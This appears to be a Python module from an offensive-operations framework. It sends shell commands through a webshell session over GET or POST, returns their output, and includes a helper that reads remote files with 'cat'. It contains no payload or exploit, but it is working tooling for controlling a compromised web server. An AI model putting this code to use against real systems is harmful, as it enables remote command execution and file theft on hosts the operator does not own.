"""Webshell command transport helper — capture remote command output."""

from __future__ import annotations

from typing import TYPE_CHECKING

from dsp.execution.providers.runtime.command import CommandRequest
from dsp.execution.webshell.event_sync.bundle_content import strip_webshell_exit_marker

if TYPE_CHECKING:
    from dsp.execution.providers.runtime.transport import TransportBackedRuntime


def run_remote_command(
    runtime: TransportBackedRuntime,
    command: str,
    *,
    timeout_seconds: float = 300.0,
) -> bytes:
    """Run a shell command on the remote host and return command output bytes."""
    session = runtime._active_session()
    runtime._require_connected(session, operation="run_remote_command")
    command_request = CommandRequest.new(command, timeout_seconds=int(timeout_seconds))
    encoded_payload = runtime._command_encoder.encode_request(command_request)
    transport_method = runtime._select_command_transport_method(
        len(encoded_payload.encode("utf-8"))
    )
    transport_request = runtime._command_transport_request(
        encoded_payload,
        transport_method=transport_method,
        timeout_seconds=timeout_seconds,
    )
    if transport_method == "send_get":
        response = runtime._dispatch_command(
            "run_remote_command",
            command_request.command_id,
            lambda: runtime._transport.send_get(transport_request),
        )
    else:
        response = runtime._dispatch_command(
            "run_remote_command",
            command_request.command_id,
            lambda: runtime._transport.send_post(transport_request),
        )
    return strip_webshell_exit_marker(response.body)


def read_remote_file_via_cat(
    runtime: TransportBackedRuntime,
    remote_path: str,
) -> bytes:
    """Fetch a remote file through ``cat``."""
    import shlex

    return run_remote_command(runtime, f"cat {shlex.quote(remote_path)}")
